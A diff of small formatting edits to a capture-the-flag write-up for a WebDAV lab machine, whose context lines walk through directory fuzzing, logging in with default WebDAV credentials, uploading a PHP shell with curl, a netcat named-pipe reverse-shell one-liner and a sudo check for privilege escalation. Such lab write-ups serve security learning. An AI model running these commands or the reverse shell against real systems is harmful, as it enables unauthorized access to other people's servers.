@@ -14,7 +14,7 @@ PORT   STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 1.76 seconds
 ```
 
-A web server on port 80, lets check it out.
+A web server on port 80, lets check it out.<br>
 Hm, apache ubuntu default page, lets try to fuzz the directories!
 ```
 $ ffuf -u http://10.10.202.252/FUZZ -w ../wordlist/custom.txt -fc 403 -fs 11321
@@ -22,15 +22,17 @@ $ ffuf -u http://10.10.202.252/FUZZ -w ../wordlist/custom.txt -fc 403 -fs 11321
 webdav                  [Status: 401, Size: 460, Words: 42, Lines: 15, Duration: 43ms]
 ```
 
-Ffuf found a login page
-Webdavs default credentials are: wampp:xampp
-Lets try to login with this Password and Username
+Ffuf found a login page<br>
+<img src = "login.png">
+Webdavs default credentials are: wampp:xampp<br>
+Lets try to login with this Password and Username<br>
+<img src="fs.png">
 Logged in successfully! We can upload files to webdav like this:
 ```
 $ curl http://10.10.202.252/webdav/ --user "wampp:xampp" --upload-file ../shell.php
 ```
 
-And now we Will open a netcat session for a better Shell
+And now i Will open a netcat session for a better Shell
 Start the listener:
 ```
 $ ncat -nlvp 8001
@@ -40,7 +42,7 @@ And execute the code in the uploaded file:
 ```
 rm /tmp/f; mkfifo /tmp/f; nc <Your_ip> 8001 < /tmp/f | /bin/sh >/tmp/f 2>&1
 ```
-And now we have a more stable Shell
+And now i have a more stable Shell
 ```
 $ ncat -nlvp 8001
 Ncat: Version 7.95 ( https://nmap.org/ncat )
@@ -63,7 +65,7 @@ www-data@ubuntu:/home/merlin$ cat user.txt
 <hr>
 <h3> 2. Task: root flag </h3>
 
-Running the command "sudo -l" shows us that we can run cat as root without Password
+Running the command "sudo -l" shows us that i can run cat as root without Password
 ```
 www-data@ubuntu:/tmp$ sudo -l   
 Matching Defaults entries for www-data on ubuntu:
